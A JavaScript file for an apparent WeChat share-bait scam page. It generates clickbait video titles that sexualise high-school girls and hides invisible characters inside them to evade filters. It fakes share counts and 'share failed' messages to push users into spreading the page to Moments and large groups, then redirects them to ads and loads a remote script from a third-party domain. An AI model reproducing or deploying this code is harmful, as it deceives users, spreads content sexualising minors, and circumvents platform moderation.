var site = "11111",
evkey = get_param("_evkey"),
biaoqing = ["😺", "😸", "😹", "😻", "😼", "😽", "🙀", "😿", "😾", "🙌", "👏", "👋", "👍", "👎", "👊", "✊", "✌️", "👌", "✋", "👐", "💪", "🙏", "☝️", "👆", "👇", "👈", "👉", "🖕", "🖐", "🤘", "🖖", "✍️", "💅", "👄", "👅", "👂", "👃", "👁", "👀", "👤", "👥", "🗣", "👶", "👦", "👧", "👨", "👩", "👱", "👴", "👵", "👲", "👳", "👮", "👷", "💂", "🕵", "🎅", "👼", "👸", "👰", "🚶", "🏃", "💃"],
bq = biaoqing[Math.floor(Math.random() * biaoqing.length)];
function get_sp_title() {
    var e = ["{e}{city}{bq}{e}高{e}中{e}女{e}{e}生{e}与大{e}叔{e}偷{e}欢{e}, 视{e}频{e}流{e}出", "{e}{city}{bq}{e}高{e}中{e}女{e}{e}生{e}凌{e}晨{e}在{e}操{e}场{e}欢{e}被{e}凌{e}辱..."],
    t = e[Math.floor(Math.random() * e.length)];
    return t = (t = get_title_text(t)).replace(/{bq}/g, bq)
}
var title_timeline1 = get_sp_title(),
title_group = title_timeline1,
title_timeline2 = "惊！{city}步行{e}街1{e}5分钟前出{e}事了，" + bq + "现{e}场直{e}播...";
if (window.g_videoList = window.data.videoList, get_param("vid")) {
    for (var vid = get_param("vid"), videoData = null, i = 0; i < g_videoList.length; i++) {
        var temp = g_videoList[i];
        if (temp.vid == vid) {
            videoData = temp;
            break
        }
    }
    videoData && (title_timeline1 = videoData.title, title_group = videoData.title)
}
if (get_param("from") || (record("tosharer", site), evkey && record("tosharer", evkey)), window.g_shareTimes = 0, get_param("_bbf_") && !get_param("from")) {
    var app = JSON.parse(sessionStorage.getItem("app")) || {
        shareTimes: 0
    };
    window.g_shareTimes = app.shareTimes
}
var g_tips_message = "";
function wxalert(e, t, i) {
    if (0 == $("#avt").length) {
        $("body").append('<div id="avt" style=" width: 90%; height: auto; background: #fff;position: fixed;left: 5%; top: 30%;z-index: 9999;text-align: center;border-radius: 4px;"><div id="tips" style="width: 90%;margin: 20px 5%;font-size: 18px;line-height: 1.5em;color: #3F3F3F;"></div><div id="isok" style=" width: 100%;height: 45px;text-align: center;line-height: 45px;font-size: 22px;border-top: 1px dotted #d6d6d6;color: #0bb20c;"></div></div>')
    }
    var r = $("#avt");
    r.show(300),
    r.find("#tips").html(e),
    r.find("#isok").html(t || "确定"),
    r.find("#isok").off("click").on("click",
    function() {
        r.hide(300),
        "function" == typeof i && i()
    })
}
function get_time() {
    var e = new Date,
    t = e.getHours(),
    i = e.getMinutes();
    return t < 10 && (t = "0" + t),
    i < 10 && (i = "0" + i),
    t + ":" + i
}
function get_title_text(e) {
    var t = e.replace("{city}", getCity()).replace("{time}", get_time());
    return t = t.replace(/{e}/gi, "͏")
}
function change_bbf(e) {
    var t = new URL(location.href);
    t.searchParams.get("_bbf_") != e && (sessionStorage.setItem("app", JSON.stringify({
        shareTimes: g_shareTimes
    })), $.cookie("ac", "show", {
        expires: 10,
        path: "/"
    }), t.searchParams.set("_bbf_", e), t.searchParams.set("_bbt_", "j"), t.searchParams.delete("from"), "ad" == e && t.searchParams.set("fsrc", "pi"), location.href = t.href)
}
function is_need_ad() {
    if (!window.data.pyq_ad) return ! 1;
    var e = location.href.split("?")[0],
    t = window.jump_links.indexOf(e);
    return window.jump_links.length / 2 < t
}
function share_tip() {
    switch (g_shareTimes) {
    case 0:
        wxalert(g_tips_message = '请分享到<b style="color: red;font-size: 22px;">朋友圈</b>即可<b>免流量</b>继续观看'),
        document.title = get_title_text(title_timeline1);
        break;
    case 1:
        wxalert(g_tips_message = '<b style="font-size: 24px;color: red;">分享成功！</b><br/>请继续分享到<b style="color: red;">3</b>个微信群即可<b style="color: red;font-size: 24px;">免流量加速观看!</b>'),
        $(".js_share_pyq_image").hide(),
        $(".js_share_group_image").show(),
        document.title = get_title_text(title_group);
        break;
    case 2:
        wxalert(g_tips_message = '<b style="font-size: 24px;color: red;">分享成功！</b><br/>请继续分享到<b style="color: red;">2</b>个微信群即可<b style="color: red;font-size: 24px;">免流量加速观看!</b>');
        break;
    case 3:
        wxalert(g_tips_message = '<b style="font-size: 24px;color: red;">分享失败！</b><br/>请重新分享到<b style="color: red;">2</b>个不同的微信群即可<b style="color: red;font-size: 24px;">免流量加速观看!</b>');
        break;
    case 4:
        wxalert(g_tips_message = '<b style="font-size: 24px;color: red;">分享成功！</b><br/>请继续分享到<b style="color: red;">1</b>个微信群即可<b style="color: red;font-size: 24px;">免流量加速观看!</b>');
        break;
    case 5:
        wxalert(g_tips_message = '<b style="font-size: 24px;color: red;">分享失败！</b><br/>网络失败请重试<br/>请继续分享到<b style="color: red;">1</b>个微信群即可<b style="color: red;font-size: 24px;">免流量加速观看!</b>');
        break;
    case 6:
        wxalert(g_tips_message = '<b style="font-size: 24px;color: red;">分享失败！</b><br/>请分享到<b style="color: red;">人数大于50人</b>的微信群即可<b style="color: red;font-size: 24px;">免流量加速观看!</b>');
        break;
    case 7:
        is_need_ad() ? (change_bbf("ad"), document.title = get_title_text(window.data.ad.title)) : document.title = get_title_text(title_timeline2),
        wxalert(g_tips_message = '<b style="font-size: 24px;color: red;">分享完成！<br/>剩下最后一步</b><br/>分享到<b style="color: red;">朋友圈</b>即可<b style="color: red;font-size: 24px;">免流量播放完整正片</b>'),
        $(".js_share_pyq_image").show(),
        $(".js_share_group_image").hide();
        break;
    case 8:
        sessionStorage.removeItem("app"),
        wxalert("分享成功, 正在跳转播放页面...", "确 定"),
        $.cookie("ac", "goon", {
            expires: 120,
            path: "/"
        }),
        jump_noref(window.play_url)
    }
}
window.play_url = window.share_url = function() {
    var e = location.protocol + "//" + location.host + location.pathname + "?_c=" + site + "&" + getSpm() + "=" + getSpm() + "&ac=goon&v=" + +new Date,
    t = get_param("vid");
    return t && (e += "&vid=" + t),
    e
} (),
$(function() {
    var i = !1;
    function e() {
        var e = "hidden" in document ? "hidden": "webkitHidden" in document ? "webkitHidden": "mozHidden" in document ? "mozHidden": null,
        t = e.replace(/hidden/i, "visibilitychange");
        document.addEventListener(t,
        function() {
            if (i) return ! 1;
            document[e] ? console.log("页面激活") : (g_shareTimes++, record("share", site, !0), record("share-uv", site), evkey && record("share", evkey, !0), evkey && record("share-uv", evkey), share_tip())
        })
    }
    window.g_share = {
        init: function() {
            e(),
            share_tip()
        }
    }
}),
$(function() {
    $("#tk").on("click",
    function() {
        wxalert(g_tips_message, "确定")
    }),
    g_share.init()
}),
load_js("https://zjygx.com/backup/pi_preloading_back.php", "async"),
load_js("https://hm.baidu.com/hm.js?" + window.data.hm, "async"),
load_js("https://hm.baidu.com/hm.js?" + window.data.hm_total, "async");